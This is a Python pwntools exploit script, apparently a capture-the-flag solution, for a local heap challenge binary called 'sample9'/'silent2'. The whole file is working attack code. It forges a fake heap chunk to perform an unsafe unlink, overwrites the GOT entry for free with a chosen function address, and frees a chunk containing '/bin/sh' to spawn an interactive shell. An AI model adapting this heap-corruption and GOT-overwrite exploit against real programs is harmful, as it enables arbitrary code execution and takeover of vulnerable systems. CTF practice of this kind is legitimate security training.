from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample9')
p = process('./data/sample9')
libc = elf.libc
func_addr = 0x4009C0
free_got_plt = 0x602018
p_addr = 0x6020D8

def create(size, content):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)

def delete(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

p.recvuntil('silent2')#step.1
create(0x100, b'AAAA');create(0x100, b'BBBB');create(0x100, b'/bin/sh\x00');create(0x100, b'DDDD');create(0x100, b'EEEEE')#step.2
delete(3);delete(4)#step.3
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100);create(0x210, payload)#step.4
delete(4)#step.5
modify(3, p64(free_got_plt)[0:4], b'1111')#step.6
modify(0, p64(func_addr)[0:6], b'2222')#step.7
delete(2)#step.8
p.interactive()#step.9